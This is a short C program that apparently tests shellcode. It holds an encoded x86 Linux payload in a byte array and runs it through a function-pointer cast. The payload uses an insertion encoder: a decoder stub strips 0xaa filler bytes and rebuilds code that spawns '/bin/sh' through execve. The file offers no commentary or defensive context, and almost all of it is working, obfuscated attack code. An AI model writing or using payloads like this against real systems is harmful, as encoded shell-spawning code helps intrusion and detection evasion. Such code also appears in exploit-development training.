#include <stdio.h>
#include <string.h>

unsigned char code [] =\
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\xeb\x16\x5e\x46\x89\xf0\x46\x89\xf3\x8a\x0b\x80\x33\x99\x74\x0d\x88\x08\x40\x83\xc3\x02\xeb\xf1\xe8\xe5\xff\xff\xff\xeb\xaa\x20\xaa\x31\xaa\xc0\xaa\x31\xaa\xdb\xaa\x5b\xaa\x88\xaa\x43\xaa\x07\xaa\x50\xaa\x89\xaa\xe5\xaa\x53\xaa\x31\xaa\xc9\xaa\x89\xaa\xe1\xaa\x31\xaa\xd2\xaa\x89\xaa\xea\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\x31\xaa\xc0\xaa\xb0\xaa\x01\xaa\x31\xaa\xdb\xaa\xcd\xaa\x80\xaa\xe8\xaa\xdb\xaa\xff\xaa\xff\xaa\xff\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x73\xaa\x68\xaa\x41\xaa\x99\x31\xc0\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80";
main()
{
	printf("Shell code length is %d \n", strlen(code));
	int (*ret)() = (int (*)())code;
	ret();
}

